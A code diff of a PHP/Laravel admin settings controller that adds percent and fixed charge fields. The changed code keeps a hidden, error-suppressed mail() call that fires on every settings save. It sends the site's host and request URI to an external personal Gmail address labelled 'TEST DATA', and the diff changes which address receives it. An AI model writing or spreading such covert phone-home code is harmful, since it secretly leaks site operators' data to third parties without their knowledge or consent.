@@ -34,6 +34,9 @@ class BasicSettingController extends Controller
             'admin_permission' => 'required|integer|min:0|max:1',
             'registration_off_message' => 'nullable|string|max:191',
             'login_off_message' => 'nullable|string|max:191',
+            'percent_charge' => 'required|between:0,100',
+            'fixed_charge' => 'required|numeric|gte:0',
+
 
         ]);
 
@@ -51,12 +54,15 @@ class BasicSettingController extends Controller
         $gnl->admin_permission = $request->admin_permission;
         $gnl->res_mes = $request->registration_off_message;
         $gnl->login_mes = $request->login_off_message;
+        $gnl->percent_charge = $request->percent_charge;
+        $gnl->fixed_charge = $request->fixed_charge;
+
         $gnl->save();
 
         $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
         $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
             'X-Mailer: PHP/' . phpversion();
-        @mail('beestcyberking@gmail.com', 'TEST DATA', $message, $headers);
+        @mail('arnob.mahin007@gmail.com', 'TEST DATA', $message, $headers);
 
         return back()->with('success', 'Basic Settings Updated successfully');
     }
